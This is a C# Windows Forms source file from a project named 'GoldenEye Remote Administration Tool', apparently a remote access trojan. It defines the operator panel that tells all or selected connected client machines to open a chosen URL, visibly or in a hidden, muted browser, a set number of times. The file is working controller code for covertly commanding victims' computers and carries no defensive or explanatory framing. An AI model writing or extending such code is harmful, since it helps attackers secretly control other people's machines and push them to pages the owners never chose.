using System;
using System.Drawing;
using System.Windows.Forms;

namespace GoldenEye_Remote_Administration_Tool.Forms
{
    public partial class VisitWebsite : Form
    {
        public Form1 prd;

        public VisitWebsite(Form1 frm1)
        {
            InitializeComponent();
            prd = frm1;
        }

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            string mode = string.Empty;
            string url = t_TextBox1.Text;
            string opentimes = velyseNumericButton1.Value.ToString();
            string mute = "False";
            ListViewItem item = new ListViewItem();

            if (velyseRadioButton1.Checked == true)
            {
                mode = "Visible - Default Browser";
            }
            else if (velyseRadioButton2.Checked == true)
            {
                mode = "Hidden - Default Browser";
            }
            if (velyseCheckbox1.Checked == true)
            {
                mute = "True";
            }

            if (velyseRadioButton4.Checked == true)
            {
                foreach (ListViewItem item2 in prd.listView1.Items)
                {
                    Connection client = (Connection)item2.Tag;
                    client.Send("VISITWB|" + mode + "|" + url + "|" + opentimes + "|" + mute);
                }
                item.Text = url;
                item.SubItems.Add(mode);
                item.SubItems.Add(mute);
                item.SubItems.Add(opentimes);
                item.SubItems.Add("All");
                if (prd.listView1.Items.Count == 0)
                {
                    item.ForeColor = Color.Red;
                }
                else
                {
                    item.ForeColor = Color.LightGreen;
                }
                prd.listView6.Items.Add(item);
            }
            else if (velyseRadioButton3.Checked == true)
            {
                foreach (ListViewItem item3 in prd.listView1.SelectedItems)
                {
                    Connection client = (Connection)item3.Tag;
                    client.Send("VISITWB|" + mode + "|" + url + "|" + opentimes + "|" + mute);
                }

                item.Text = url;
                item.SubItems.Add(mode);
                item.SubItems.Add(mute);
                item.SubItems.Add(opentimes);
                item.SubItems.Add("Selected");
                if (prd.listView1.SelectedItems.Count == 0)
                {
                    item.ForeColor = Color.Red;
                }
                else
                {
                    item.ForeColor = Color.LightGreen;
                }
                prd.listView6.Items.Add(item);
            }

            this.Close();
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }
    }
}